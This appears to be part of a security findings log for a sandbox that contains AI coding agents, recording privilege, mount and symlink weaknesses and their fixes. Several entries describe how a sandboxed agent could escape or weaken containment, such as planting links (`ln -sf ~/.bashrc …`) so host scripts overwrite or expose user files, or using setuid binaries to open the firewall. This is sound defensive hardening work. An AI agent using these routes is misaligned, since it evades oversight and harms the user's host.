- **Status: FIXED** (2026-10-29; found by the review of the ENV-7 fix, LOW-2). The label is the project's id, `sha256:` and a SHA-256 of the engine copy's physical path keyed with a random key of the user's, `~/.ai-containers/project-id.key`, made 0600 on first use (sandbox-common.sh: `ai_containers_project_id()`), and `build.sh` records each id with its path in `~/.ai-containers/image-projects.conf` after a build (`ai_containers_project_record()`, quiet, and never failing the build). `ai_containers_retag_check()` recognises this project's id by computing it, so a lost record costs nothing there, and looks another's up, then judges the recorded path exactly as a path label (moved, unmounted drive, another user's directory, still there). An id the record does not name was built on another machine, by another user of this docker or under another `HOME`, or with a key since lost, and is refused, naming the record, the key and the ways out (remove the image, rename yours, or `IMAGE_NAME=<it> ./build.sh` to replace it): a teammate who pulls an image and rebuilds over it got a NOTE before. Its review: unkeyed, as first written, the id let anyone who guessed the path confirm it (a guess loop over common layouts found one in 5 s; M1); the record was trusted as written, so a CRLF, a trailing space, an earlier conflicting line, or an append onto a last line with no newline turned the refusal for an existing project into a NOTE (M2), and now a line counts only if its id is its path's, and an append starts a line of its own; an image built with no id to give (no `sha256sum` or `shasum`) recorded no project in silence and now says so (L1); a record that is a FIFO hung the build (L2); the refusal named too few causes (L3). Not `projects.conf`, as the direction below suggested: it lives in the base checkout a project's copy cannot find, and holds neither the base itself nor an unregistered copy. A path label, from an image built before, is read as before. `tests/test-image-retag.sh` runs every other-project check for both label forms; on the old code 20 of its checks fail. Its second review: a record the build cannot read ended `build.sh` in silence after `docker build`, under its `set -e` (MEDIUM), and the record is now passed by unless it can be read and written; the FIFO checks used `timeout(1)`, which macOS lacks (MEDIUM), and use `p_timeout` through a helper that keeps a regression from hanging the suite; an unreadable key printed raw errors, a key the tool did not make was never said to be removable, and a filesystem with no hard links got no key (LOW).
- Severity: LOW. Confidence: CONFIRMED (the label is the engine copy's physical path)
- Location: `sandbox-common.sh: ai_containers_provenance_labels()`, the `ai-containers.project` label
- What's wrong: `docker push` of an image sends `/home/<user>/<dir>/.ai-containers` to the registry: the user name and directory names. `built-at` and `source-commit` were already there, but this is the first personal field. A teammate who pulls such an image and rebuilds over it gets the NOTE that its project path no longer exists, naming that path.
- Fix direction: a hash of the path, looked up in `projects.conf` to name the other project in the warning, or the project's name alone.

### LNCH-15: the once-per-launch "cannot make a temporary directory" WARNING is not asserted
- **Status: FIXED** (2026-10-28). T51 now launches over two repositories with an index each under the stale TMPDIR and requires the warning exactly once; with the once-only guard removed it counted 2.
- Severity: LOW. Confidence: CONFIRMED (no test names it)
- Location: `sandbox.sh: _git_index_read()`, its `mktemp -d` failure branch
- What's wrong: T51 checks the FIFO search's refusal only. Where a git directory is protected, the launch is refused by that search anyway, so the warning matters only for an index read with nothing bound read-only.
- Fix direction: assert the warning, once, in T51's second arm.

## 14. Found while fixing RT-8

### RT-10: the agent shell itself has no `no_new_privs`
- **Status: FIXED** (2026-10-28). Each mode's `exec capsh` passes `--no-new-privs` before `--user=` — in the image, so it holds however the container is started, rather than as a `sandbox.sh` option the harness would only mirror. Measured with the image's `capsh`: `--drop=… --no-new-privs --user=probe` gives `CapEff 0`, `NoNewPrivs 1` (after `--user=` works the same; the order is not load-bearing). Its review measured git over ssh, `ssh-agent`, gpg, git, node and python unchanged, `unshare -U` refused by Docker's seccomp either way, and discovery-mode `ping` still working through the unprivileged ICMP socket `ping_group_range` allows — the fix direction below expected it to stop. Cases `070`, `230` and `240` now `assert_no_new_privs` on PID 1 (`tests/integration/lib.sh`), and mutation `070-230-240-shell-new-privs` removes the flag from all three branches. Mutations `240-open-keeps-capabilities` (its ambient raise still lands `cap_net_raw` under `no_new_privs`, measured) and `322-app-env-not-given-back` were regenerated for the new line.
- Severity: MEDIUM. Confidence: PLAUSIBLE (no exploitable setuid binary known; the mechanism measured)
- Location: `entrypoint.sh`, the final `exec capsh` of each mode; `sandbox.sh`, the `docker run` options
- What's wrong: the user steps before the drop now run with `no_new_privs` (RT-8), but the shell they hand over to does not, and its bounding set still holds Docker's defaults (`CAP_SETUID`, `CAP_DAC_OVERRIDE`, `CAP_CHOWN`, …). A setuid-root binary the image ships (`passwd`, `chsh`, `mount`, `su`, `ssh-keysign`, …) run from that shell, with any bug in it, is euid 0, which can rewrite the root-owned `/tmp/allowlist-cidrs.txt` the refresh loop reloads every 60 s: the firewall opened without NET_ADMIN.
- Fix direction: `sandbox.sh` passes `--security-opt=no-new-privileges` (measured by the review: `runuser` and `capsh` still work, the root entrypoint loses nothing; discovery-mode `ping`, a file-capability binary, stops working), or `setpriv --no-new-privs --` in front of each `exec capsh`, or the setuid bits stripped at build time.

### RT-11: a `docker exec -u` session does not get `no_new_privs`
- **Status: FIXED** (2026-10-28). `sandbox.sh`'s `docker run` passes `--security-opt=no-new-privileges` in every mode (`tests/test-mode-capabilities.sh` asserts it for all three), and `tests/integration/lib.sh: sandbox_up()` deliberately does not — the first version mirrored it, and its review measured that this made RT-10's mutation survive, since the option alone gives PID 1 `NoNewPrivs 1`. New case `250-exec-session-no-new-privs` launches through `sandbox.sh` (`launcher_up open`), requires `NoNewPrivs 1` in a `docker exec -u <agent>` session, a root exec session and PID 1, and the effect: a setuid-root copy of `id`, made as root, still reports the agent's uid from the agent's session. Run locally: 250 passes alongside 070, 230 and 240; under mutation `250-exec-session-gains-privs`, which removes the option, 250 fails all three exec-session assertions (`NoNewPrivs 0` twice, and the setuid `id` copy reports uid 0) while PID 1 keeps RT-10's flag; and with `sandbox_up` no longer passing the option, RT-10's mutation `070-230-240-shell-new-privs` fails 070, 230 and 240 again.
- Severity: LOW. Confidence: CONFIRMED (measured: PID 1 `NoNewPrivs: 1`, a `docker exec -u probe` shell `NoNewPrivs: 0`, `/usr/bin/passwd` still setuid)
- Location: `sandbox.sh`, the `docker run` options
- What's wrong: RT-10 sets the flag on the agent shell, and a `docker exec` session is a fresh process from the daemon, outside that tree. AGENTS.md already says to run one as the agent (`-u`), not root; as the agent it can still exec a setuid-root binary.
- Fix direction: `sandbox.sh` passes `--security-opt=no-new-privileges` too, which the daemon applies to `docker exec` as well. Measured by the review: the root entrypoint still works under it (`setpriv … runuser`, `capsh --user=`), and `dumpcap`/`tshark` carry no file capabilities, so capture is unaffected. (This said the harness's `sandbox_up` should mirror it, as it mirrors `--cap-add`. Wrong, as the fix's review showed: the option sets the flag on PID 1 by itself, which would have hidden RT-10's from cases 070/230/240.)

### RT-12: `/etc/profile.d/ai-tools.sh` breaks a POSIX `sh` login shell
- **Status: FIXED** (2026-10-29). The line is `if [ -n "${BASH_VERSION:-}" ]; then eval 'npm-agent-tools() { … }'; fi`: dash never parses the name, and sourcing the file under it returns 0 (`[ … ] && eval` did not). Case 310 runs `sh -l -c` and requires a clean start, and `bash -l -c 'type -t npm-agent-tools'` and requires `function`; mutation `312-profile-function-unguarded` puts the plain definition back and fails exactly the first (demonstrated, rebuilt image). Its review: the guard also skips bash's posix mode, where the image's bash 5.2 refuses the name fatally (5.3 accepts it); `/etc/profile.d/rvm.sh`, written in ruby images, had the same fault under dash (`source: not found` for a user with `~/.rvm`, status 1 for one without), and its loading is now an `if` under bash too. New `tests/test-profile-scripts.sh` generates both files with the Dockerfile's own printf lines and sources them under dash, with and without `set -e`, under bash (the function forwards `'a b'`, `''` and `'c*d'` intact) and under posix-mode bash; main's Dockerfile fails six of its checks. Case 310 also requires the arguments to arrive intact and an interactive bash to define the function.
- Severity: LOW. Confidence: CONFIRMED (`su - u` of a user whose shell is `/bin/sh`, in the Node 26 image)
- Location: `Dockerfile: npm-agent-tools()`, the function the image writes into `/etc/profile.d/ai-tools.sh`
- What's wrong: `/etc/profile` sources every `/etc/profile.d/*.sh` in whatever shell reads it, and dash cannot parse a function name with a hyphen, so a `sh -l` login (or `su -` to a user whose shell is `sh`) stops with `/etc/profile.d/ai-tools.sh: Syntax error: Bad function name`, before the rest of that file and of `/etc/profile` runs. The sandbox user's shell is bash (`entrypoint.sh: useradd_matching_host_uid -M -s /bin/bash`), so the agent shell and `bash -l` are unaffected; a `docker exec … sh -l` is not.
- Fix direction: define the function only under bash (`[ -n "${BASH_VERSION:-}" ] &&` before it, or move it to `/etc/bash.bashrc` beside nvm), and say why where it is written.

## 15. Found while fixing batch 10

Batch 10 went through seven review rounds, a review of its merge with main and one of the fixes that review asked for (`162d4c3`, `708742d`); every HIGH and MEDIUM they found was fixed or, where the user chose, designed out (GIT-13). What they left open:

### GIT-21: a bare repository created mid-session can borrow a listed fixture's exemption
- **Status: CLOSED (batch 11)** — `04e56e3`: no longer applies; there is no fixture exemption to borrow (GIT-11).
- Severity: LOW. Confidence: PLAUSIBLE (reproduced with the fixture loop alone, not end to end)
- Location: sandbox.sh, the `SANDBOX_GIT_FIXTURES` loop in `launcher_ro_overlay()` (removed in batch 11)
- What's wrong: a bare repository no launch has protected yet (one you create during a session) can be moved by the agent onto a listed `SANDBOX_GIT_FIXTURES` path, with a link left at its old path. The next launch takes the fixture path, a real directory now, for the fixture; the scan does not follow the link, and your `git push` goes through it into a repository with no placeholders and no first-protection NOTE.
- Fix direction: print the first-protection exec-key and hooks NOTE for fixtures too, or warn when a link in a writable mount leads to a listed fixture. AGENTS.md already lists a repository the agent creates before its first protection as not covered.

### GIT-22: nothing tests that another user's unlistable `.git` is refused
- **Status: FIXED** (batch 13, `837daef`, `3a4848e`): G66b, where the suite runs as root (the floor container), hands the tree to one uid and a 0711 `.git` to another and launches as the first through `setpriv`; a mutant that puts ownership back into the refusal fails it.
- Severity: LOW. Confidence: CONFIRMED (no test makes a directory another user owns)
- Location: sandbox.sh: `if [[ "$kind" == unr && -x "$g" ]]; then`
- What's wrong: G66 uses a `.git` of the launching user's; one that put an ownership check back into the condition would pass both suites. A non-root test cannot make another user's directory.
- Fix direction: an integration case run as root, or a falsify survivor entry.

### ENV-9: an unmounted drive's empty mount point passes for a moved project
- **Status: FIXED** (batch 13, `837daef`, `3a4848e`): refused when the nearest existing directory is empty or a removable-media root (`_ac_removable_root()`: `/Volumes`, `/media/<user>`, `/run/media/<user>`). A parent emptied by moving its only project out is refused the same way; the message says how to go on.
- Severity: NIT. Confidence: PLAUSIBLE (from code)
- Location: sandbox-common.sh: `while [[ -n "$up" && ! -e "$up" ]]; do up="${up%/*}"; done`
- What's wrong: a project on a drive that is not mounted looks gone, so a committed `IMAGE_NAME` naming its image is rebuilt with the NOTE rather than refused.
- Fix direction: refuse when the nearest existing ancestor is an empty mount point, or accept it as the NOTE says.

### LNCH-16: `SANDBOX_GIT_FIXTURES` is portable, so a commit can name a repository you push to
- **Status: FIXED (batch 11)** — `04e56e3`: `SANDBOX_GIT_FIXTURES` was removed, not made machine-only: every bare repository gets its placeholders (GIT-11; the user's choice). The entry below said "the same trust as a committed `SANDBOX_GIT_MAX`", which was wrong: raising that cap protects more repositories, while this key was the only committed one that turned protection off.
- Severity: LOW. Confidence: CONFIRMED (by design)
- Location: sandbox-common.sh, `env_key_portable()` (the key removed in batch 11)
- What's wrong: a team can commit the fixture list, which is the point; a malicious commit that you pull can list a bare repository you push to, which then gets no placeholders. The same trust as a committed `SANDBOX_GIT_MAX`. Entries are plain paths inside the project with no link on the way.
- Fix direction: make it machine-only (`env_key_machine_only`) if a committed list is not wanted.

### LNCH-17: nits
- **Status: CLOSED** (batch 13, `837daef`), item by item: the uutils `ls` one was fixed as LNCH-21 (`42afd37`); the TMPDIR WARNING now quotes with `_q` like the ERROR beside it; G90 and G91 use their own numbers in their names. Accepted as they are: `_q()`'s `\xHH` fallback stays as a guard for a bash whose `%q` lets a control byte through; the doubled tests stay, since each pins a different review's case; `_rd_errfd` is reached by G86, whose cut-off read refuses the launch through `_rd_fail()`; the macOS verification NOTE on every launch is deliberate, so a skipped check is never silent.
- Severity: NIT
- On a host with no `getfacl` whose `ls` is uutils, every unlistable directory fails closed (round 1).
- `_q()`'s `\xHH` fallback cannot be reached where bash's `%q` already escapes high bytes under `LC_ALL=C` (round 1).
- Several fixes have two tests since the merge (G90/G73, G91/G74, G44's gtimeout arm and G75, T51/T53); G44's extra launch costs ~20 s (merge review).
- The index read's TMPDIR WARNING renders its path with `_term`, the FIFO refusal with `_q` (merge review).
- G90 and G91 keep their old numbers inside, in variable and path names (`U72`, `M72`, `real73`) (merge review).
- The line that opens `_rd_errfd` at the top of `sandbox.sh` has no test of its own; `_rd_fail()`'s tests reach it only through a launch.
- Where the verify directory's inode does not survive the bind (macOS Docker Desktop; Colima until PLAT-3, 2026-11-08, which takes them from its VM), the NOTE that verification is skipped prints on every launch, so the output directories batch 10 added to the manifest are not verified there either.

### LNCH-18: with no `getfacl`, refusing an `ls` that is neither GNU's nor BSD's is not tested
- **Status: FIXED** (batch 13, `837daef`): T25g has an arm with no `getfacl` and a busybox `ls` on a `PATH` of its own, so the refusal is reached on every host.
- Severity: LOW. Confidence: CONFIRMED (a mutant that trusts any `ls` there passes `tests/test-launcher-dir-ro.sh`)
- Location: sandbox.sh: `_agent_bits_writable()`, its branch for a host with no `getfacl`
- What's wrong: Linux hosts have `getfacl`, T25h's busybox arm puts a fake `getfacl` on `PATH`, and the floor containers run as root, which skips T25. On macOS, which has no `getfacl`, T25g runs the branch with BSD `ls` only, so the part that refuses any other `ls` is reached by no test.
- Fix direction: a T25 arm with a `PATH` that has no `getfacl`, built from links to the tools the launch needs.

## 16. Found while fixing REPO-11

### REPO-13: an attached repo is mounted by its volume's name, whatever its label says
- **Status: FIXED** (2026-10-28). Before the `REPOS` attach loop, `sandbox.sh` checks every entry with `_repo_volume_foreign()`: the base volume of each volume-backed entry, and for `:rwcopy` the working copy too, which is reused if it exists and whose `<base>--wc-<tag>` name collides the same way. One labelled for another repo refuses the launch, naming the prefix it belongs to, before any working copy is seeded or anything mounted — the first version checked inside the loop, after an earlier entry's copy had been seeded, and not the working copy at all (its review). The loop is the one place repo volumes are mounted: the `@repo` working directory and the `DOCS_PATH`/`SPECS_PATH`/`ARCHITECTURE_REPO_PATH` `@name` forms are entries in it. Hermetic, `tests/test-docs-path.sh` (its fake `docker` answers labels per volume and logs every call): a foreign base volume, a foreign working copy, and `good:rwcopy bad:rw` seeding nothing — each red on the old code, which attached the other repo's volume `:rw`; its own label and none attach as before.
- Severity: LOW. Confidence: PLAUSIBLE (from code; the same collision REPO-11 reproduced)
- Location: `sandbox.sh`, the `REPOS` attach, which checks `repo_volume_exists` only
- What's wrong: with a registered `docs` whose base volume is labelled for another repo (a nested `REPO_VOLUME_PREFIX`), `REPOS="docs:rw"` mounts that other repo's volume read-write for the agent, `:rwcopy` seeds a copy from it, and `:ro` shows its content as `docs`. Unlike `rm`, this hands another repo's data to the agent.
- Fix direction: refuse the launch when the base volume's `ai-containers.repo` label names another repo, as `repo.sh: foreign_base_owner()` does.

### REPO-14: `rm`'s refusal over another repo's volume does not mention the name's own working copies
- **Status: FIXED** (2026-10-28). The refusal names `./repo.sh gc --repo <name>` for the name's own working copies; asserted in `tests/test-repo-destructive.sh`.
- Severity: NIT
- Location: `repo.sh: cmd_rm()`, the foreign-owner refusal
- What's wrong: it says how to drop the registry line, not that the name's own labelled working copies stay; `./repo.sh gc --repo <name>` removes them.
- Fix direction: name that command in the message.

### REPO-15: some dropped tags are labelled more cautiously than they are
- **Status: FIXED** (2026-10-29). `on_remote()` counts the clone's tags, which are the remote's, beside its branches, and returns 2 when the clone cannot see the commit at all (the volume's objects are not linked when it names alternates of its own), reported `?` instead of `no`. A tag the remote has at another object is `TAG|<name>|moved|<on>`, which `repo.sh` renders as `REPLACE tag … with the remote's`, at risk only when this one's commit is not kept; on the same commit through another object (lightweight here, annotated there) it is `same`, and says that only this tag's own object goes (review, L5). `pull`'s refusal now says "no remote branch or tag". `on_remote()` reads no commit-graph (`-c core.commitGraph=false -c core.multiPackIndex=false`), as the branch counts already did: in inspect the volume's objects are an alternate store, and git reads a commit-graph from there (automated security review). A test forges one, the remote tip given a local-only commit as its parent: `rev-list` follows it, so the branch counts' existing guard now has a test (red with it removed: the local branch counted 0 unpushed); `for-each-ref --contains` and `merge-base --is-ancestor` were not fooled by this forgery on git 2.56, so `on_remote`'s guard is defence with no test that reaches it. Tests: a tag on a commit only a remote tag reaches, moved tags with their commit kept and lost, and the alternates case in `tests/test-repo-git-reset.sh`; the summary in `tests/test-repo-destructive.sh`; each red on the old code.
- Severity: LOW. Confidence: CONFIRMED (measured by the review)
- Location: `repo-git-reset.sh: cmd_inspect()`, the `TAG|` record
- What's wrong: a local tag on a commit only a remote *tag* reaches is reported lost and counted (`no|no`), though the clone keeps that commit; a tag the remote has at another object is described as "not on the remote" where the remote's version replaces it; with the volume's own alternates file an unreachable commit is `no`, not `?`. Each errs toward warning.
- Fix direction: test reachability from `refs/tags/` of the clone too, and name the moved-tag case.

### REPO-16: a helper killed during `inspect` leaves reset's summary silent about what it did not report
- **Status: FIXED** (2026-10-29). `inspect` ends with `END|inspect`, after the tags and on the STALE path too; `collect_inspections()` adds `INSPECTION CUT SHORT … <-- may hold unpushed work` and counts it at risk when the record is missing. Tests: the last record in both helper paths, and a summary from a fake helper that stops before it (red on the old code), and none when it does not.
- Severity: LOW. Confidence: PLAUSIBLE (from code)
- Location: `repo.sh: collect_inspections()`, which reads `< <(inspect_git …)` and never sees its exit status
- What's wrong: `STASH` and `TAG` are the last records, so a helper killed after the `BRANCH` records (137, out of memory) leaves the summary without them, and reset goes on; only the helper's ERROR on stderr says so.
- Fix direction: have the helper end with an `END|` record and treat a summary without one as unknown, at risk.

### REPO-17: `check_volume()` and `nested_in()` match the volume's own `.git` with `find -path`, a glob
- **Status: FIXED** (2026-10-29). `glob_quoted()` escapes `*`, `?`, `[`, `]` and `\` in the volume's path wherever `find -path` takes it as a pattern: `check_volume()`, `nested_in()`, `remove_nested()`, and `other_ref()`, which had the same fault. A loop, since `${s//…/\&}` is bash 5.2's. Test: a repository in a directory named `gl[o]b*` keeps its `.git` through inspect and reset (red on the old code: listed as nested, and removed).
- Severity: LOW. Confidence: CONFIRMED (from code; the reviewer's probe)
- Location: `repo-git-reset.sh: nested_in()`, `-path "$1/.git" -prune`, and the same `-path "$gd"` in `check_volume()`
- What's wrong: `-path` takes a glob, so a volume path holding `[`, `*` or `?` does not prune its own top-level `.git`, which is then listed as nested and, by `reset`, removed before the clone's `.git` replaces it. Production always passes `/dst`, so it cannot happen there; only a direct run of the helper on such a path, as a test does, would meet it.
- Fix direction: `cd` into the volume and use `-path ./.git`, or escape the glob characters in the pattern.

### LNCH-21: under uutils coreutils with no `getfacl`, an unlistable directory is always taken for agent-writable
- **Status: FIXED** (2026-10-28). `_agent_bits_writable()` trusts uutils' `ls` beside GNU's and BSD's where there is no `getfacl`: measured in ubuntu:25.10 (uutils 0.2.2) and ubuntu:26.04 (0.10.0, this host's) with `setfacl`, it prints `+` for an ACL (access, default-only, masked, group; ext4, tmpfs, overlay — its review) and the bare mode otherwise. Its `+` marks any extended attribute, so it can only over-report; but its `.` for a security context takes the place of the `+`, where GNU's keeps the `+`, so from uutils only the bare mode is taken as plain (no packaged Ubuntu build prints `.`; its review). The `(uutils coreutils)` string first appears in 0.1.0, after ACL marking (0.0.24), so no trusted version misses an ACL; older builds print no such string and still fail closed, and a build that names itself so with a number before 0.1.0 is not trusted either (automated security review; T25i's `0.0.23` shim). New T25i runs the rule in a `PATH` of `find`, a `uname` that says Linux and a shim `ls` that says it is uutils, so neither the host's `ls`, its `getfacl` nor its kernel decides: plain is not counted, `+` and `.` are (red on the old code on every host). T25g passes on this host again.
- Renumbered from LNCH-19 (2026-10-28): batch 11 logged its own LNCH-19 (the group checks) at the same time. Commit messages `5b2c891`, `781c2f4`, `f603639` and `27a5fd4` call this one LNCH-19.
- Severity: LOW. Confidence: CONFIRMED (this host: `ls (uutils coreutils) 0.10.0`, no `getfacl`; `tests/test-launcher-dir-ro.sh` T25g fails `plain grp-other-gid` on clean main; CI's GNU `ls` passes it)
- Location: `sandbox.sh: _agent_bits_writable()`, the ls-based ACL fallback
- What's wrong: with no `getfacl`, only GNU's or a BSD `ls` is trusted to say a directory has no ACL (LNCH-6); uutils' `ls`, the default `ls` of recent Ubuntu releases, is neither, so the check fails closed and a directory nobody but its owner can write counts as agent-writable — a launch over one that is searchable but unlistable is refused where it need not be. It fails closed, so it costs usability, not safety. LNCH-18 already notes that this branch is untested in CI.
- Fix direction: measure whether uutils' `ls -ld` marks an ACL with `+` and trust it if it does; otherwise say in the refusal that installing `acl` (`getfacl`) lets the check decide. Make T25g's vectors independent of the host's `ls`, as T25h's shim does.

### LNCH-19: the group checks compare physical paths, not device:inode
- **Status: FIXED** (batch 12, `e2905c5`): the group directory is also compared with `$HOME` by `_launcher_dev_ino()`, both through a trailing `/.`; tested with a `stat` shim standing in for the alias (G92).
- Severity: LOW. Confidence: CONFIRMED (a bind mount of `$HOME` onto `~/.ai-containers/bm`, inside `unshare -rm`, launched and mounted the real `~/.ssh`)
- Location: sandbox.sh: `run_container()`, the "is your home directory" refusal
- What's wrong: the group directory is compared with `$HOME` by `pwd -P`, so an alias that is the same directory by another path — a bind mount, a macOS firmlink, another case on a case-insensitive filesystem — is not caught. Each needs a deliberate setup, usually root, and the agent cannot create `~/.ai-containers/<group>`.
- Fix direction: compare `_launcher_dev_ino()` of the two instead.

### LNCH-20: batch 11 leftovers
- **Status: FIXED** (batch 12, `e2905c5`, `f15b6dc`, `82a9dab`): build.sh runs `validate_group_name` and prints the NOTE naming the file (`host_group_source()`, shared with the launch); the launch's NOTE and sync-to-projects.sh's warning read the files with `load_env_defaults` in the launcher's order, sync's only after its loader reads a probe back; each link-refusal hint follows the target; the menu's list is `group_menu_choices()`, tested; G92 pins the checks before any docker call or output directory. Left as is (NIT): a FUSE mount of `$HOME` (its own st_dev) is not caught; with the shell exporting `host` and a file saying it too, the NOTE names the file.
- Severity: LOW (the first three) and NIT
- `build.sh` does not check the group, so a `host` project's `runme.sh` builds the whole image before the launch refuses it.
- No test pins that the group checks run before the `REPOS` `:rwcopy` volume and the output directories are made; G92 would pass with them moved back down.
- The group-bootstrap menu's new filter (no `host`, no hidden directories) has no test: the menu needs a terminal.
- The host-group greps accept `AI_CONTAINER_GROUP = host`, which the loader ignores, and flag a file whose first `AI_CONTAINER_GROUP=` line, the one the loader keeps, names another group.
- No test covers the greps' `export` prefix or exact match, nor the link refusal's "another group" and "leads nowhere" hints.
- The "another group" hint can name a directory that is not a valid group (`.verify-*`); "It leads nowhere" also covers a link to a file or an unsearchable directory; the "another disk" advice is printed for a link into `$HOME`, where it does not fit (it prints no command).

## 17. Found while demonstrating the regenerated mutation patches

Batch 11 regenerated patches 467, 500, 510 and 710. Each was applied and its case run against an image built from `76ea3ef` (2026-10-29): 467 turns case 465 red, 500 turns 500 red, 510 turns 510 red, each on the assertions its header names; the unpatched cases pass.

### TST-23: case 710 no longer notices that the group's `~/.ai-tools` is not mounted
- **Status: FIXED** (2026-10-29). The first container writes a marker into `~/.ai-tools` as the agent (`agent_exec`), and the second must find it; no tool is required for that, so a failed vale download cannot fail the case. The patch's own description, which said the second container would not find claude, now says what it breaks. Against `710-ai-tools-not-group-mounted` the case now fails on that assertion; unpatched it passes (4 assertions).
- Severity: LOW. Confidence: CONFIRMED (the patch applied, case 710 passed with 3 assertions in 406 s)
- Location: `tests/integration/cases/710-agent-tools-reused-not-reinstalled.sh`
- What's wrong: since `35b8342` (2026-08-24) the case watched only Claude Code, which installs natively under `~/.local/share/claude`, a mount of its own. The mutation drops the `~/.ai-tools` mount, which the case no longer looked at, so it survived, and nothing verified that a group's npm, uv and vale tools are reused. Batch 11 regenerated the patch's context only; the gap is older. An mtime check on vale was tried first and also passed against the mutation: the release tarball's mtime survives extraction.
- Fix direction: done as above.

## 18. Found while fixing GAP-6

GAP-6's reviews (an Opus reviewer over three rounds, and an automated security review) hardened every write to `runme.sh`: it is read once through a checked open and replaced by an exclusive create and a rename (project-files.sh: `_proj_read()`, `_proj_write()`). They found that the rest of `sync_project` still opens files in the project's `.ai-containers/` by path.

### PRJ-10: sync writes and reads the project's other files by path, through a link the agent can plant
- **Status: FIXED** (2026-11-02). Every file sync writes in a project goes through project-files.sh: `_proj_write()` (built privately, one exclusive create beside the target, renamed in): the shared files (with the engine copy's mode), `engine-version`, `sandbox.env`, `sandbox.conf` (reconciled on a private copy read through `_proj_read()`, which the migration hooks get) and both `.gitignore`s. A linked `sandbox.conf` or project `.gitignore` is named in a `NOTE:` and left; a linked inner `.gitignore` is replaced by a file of the patterns; a dangling `sandbox.env` link is replaced by the backfilled file, never written through. The `sandbox.env` backfill reads only regular files, each through `_proj_read`. The fragment directories are rsynced as `<dir>` into the copy, not `<dir>/` into `<dir>/`, so a link there is replaced by a real directory. `ensure_ai_containers_ignored`, two copies in project-init.sh and sync-to-projects.sh, is one definition there. Wider than first logged: `cp` of the shared files and the project's root `.gitignore`, which the agent can always write, were affected too. A write or fragment rsync that fails is an `ERROR:` for its project (sync-to-projects.sh: `sync_error()`) and the run goes on to the next and exits 1: returning from `sync_project` under `set -e`, or a bare rsync that could not replace a planted directory (exit 23), stopped every later project. A failed `mktemp -d` or migration hook still ends the run, as before. `tests/test-sync-no-follow.sh` (10 checks fail on the old code; a FIFO hung the backfill). Its review: `tests/test-parsers.sh`'s fixture lacked the new file (HIGH, red); the docs said `project-init.sh` was converted too when only one function was (HIGH; now PRJ-11); the abort above (MEDIUM); and the test missed a backfill written through its link and three of the five fragment directories (MEDIUM). Accepted trade-offs: a `.gitignore` is now replaced by rename, so a hard link, owner or ACL on it is not kept; a shared file takes the engine copy's mode; a linked fragment directory is replaced by a real one (its `custom.txt` stays where the link pointed); a temporary copy of `sandbox.conf` is left in `$TMPDIR` if a migration hook fails. Not run on macOS: openrsync's handling of a linked destination directory.
- Severity: LOW. Confidence: CONFIRMED by reading the code (not exploited)
- Location: sync-to-projects.sh: `backfill_sandbox_env()` (`grep … "$dest"/*.sh`, `cat > "${dest}/sandbox.env" <<EOF`), `conf_set_version()` and the reconcile (`cat "$tmp" > "$f"`, `>> "$f"`), `ensure_inner_gitignore()` (`>> "$gi"`)
- Introduced: before the window (the reconcile and backfills predate it).
- What's wrong: the agent cannot write `.ai-containers/` while the launcher overlays it read-only. It can when that directory is itself a writable mount root, which the launch allows with a `NOTE:`, and the agent has your UID. Then a `sandbox.conf`, `.gitignore` or (in a project that predates it) `sandbox.env` replaced by a link to a host file makes the next sync write into that file, and a link or FIFO among `*.sh` is read by the `sandbox.env` backfill (a FIFO hangs the sync).
- Failure scenario: `.ai-containers` mounted writable; the agent runs `ln -sf ~/.bashrc .ai-containers/.gitignore` after deleting a required pattern; the next `./sync-to-projects.sh` appends `sandbox.local.env` and the other patterns to `~/.bashrc`.
- Fix direction: done as above.

### PRJ-11: project-init.sh and migrate-runme.sh write a project's files by path, through a link the agent can plant
- **Status: FIXED** (2026-11-02). Every write listed below goes through project-files.sh: backups by `proj_backup()` (read through `_proj_read()`, written by `_proj_write()` with the original's mode; a link is named and not backed up), `sandbox.env` and `sandbox.local.env` built privately and renamed in with the old file's mode (a re-init reads the old `sandbox.env` from its private copy), the shared files and a new `sandbox.conf` by `_proj_write`, `custom.txt` only where nothing, not even a dangling link, is there, the inner `.gitignore` by sync's `ensure_inner_gitignore()` (moved there), `engine-version` by `proj_version_record()`, and the launcher by `proj_emit_launcher()` (project-init.sh), which emits privately and renames in. migrate-runme.sh reads the old launcher and `sandbox.env` once into a private copy and skips a linked `runme.sh`. project-init.sh, migrate-runme.sh and sync refuse a `.ai-containers` that is itself a link (`proj_dest_ok()`). `tests/test-init-no-follow.sh`: 18 checks fail on the old code; each converted write is killed by a demonstrated mutant except `custom.txt`'s, which GNU `cp` already refuses to write through a dangling link (ENV-DEPENDENT: a BSD `cp` may not). `warn_host_group()`'s reads by path remain: it only prints. Its review: the link check ran once, before the launcher's Overwrite prompt, which waits as long as you take, and a `.ai-containers` renamed and replaced by a link meanwhile took the launcher wherever the link pointed (MEDIUM, reproduced through a FIFO); all three scripts now hold the directory open and `_proj_write()` refuses once the path no longer names it (project-files.sh: `proj_dest_pin()`), which leaves only the instant between that check and the create. A `sandbox.env` that cannot be read was replaced with no backup, losing its kept keys (MEDIUM), and now stops the re-init; its second look found migrate-runme.sh doing the same, and it now stops that project's migration. Also: the inner `.gitignore`'s NOTEs were hidden behind a success line; migrate-runme.sh wrote a 0600 `sandbox.local.env` back 0644, and backed up from a second read rather than the copy it parsed; the test could not fail for `engine-version` (its engine had no version) or for migrate's link check.
- Severity: MEDIUM. Confidence: CONFIRMED (re-initialised a scratch project whose `.ai-containers` held links to victim files: each was overwritten, the `runme.sh` one made 0755, and the engine's `tools.d` written into a linked victim directory)
- Location (before the fix): project-init.sh — the fragment rsync (`dir/` into `dir/`), the shared-file and `.pre-init` copies with `cp`, `sandbox.env` read and written by path, `sandbox.local.env` written by path, `custom.txt` copied from its template, the inner `.gitignore` appended to, and the launcher written by `emit_launcher()` then made executable; migrate-runme.sh — its `.pre-migrate` copies, `sandbox.env`/`sandbox.local.env` writes and launcher, and the old launcher parsed by path. Also by path, in sync: `warn_host_group()` reads the env files after a `[[ -f ]]` that follows links.
- Introduced: before the window.
- What's wrong: the same as PRJ-10, for re-running `project-init.sh` (or `migrate-runme.sh`) on a project the agent has written. Worse than a write: with `sandbox.local.env` linked to a 0600 file of yours, re-init copied that file into `.ai-containers/sandbox.local.env.pre-init`, where the agent can read it, and then overwrote it.
- Fix direction: done as above.

---

# Appendix: what each reviewer checked and cleared

## 19. Found while doing GAP-1, GAP-3 and GAP-4

The falsify work (2026-11-03) activated nine targets, added the `stmt-delete` operator and ran mutants of every active script on a developer host, which is how this showed.

### TST-24: test-rvm-reconcile.sh hands the host's rvm environment, and in one case the real network, to the code it tests
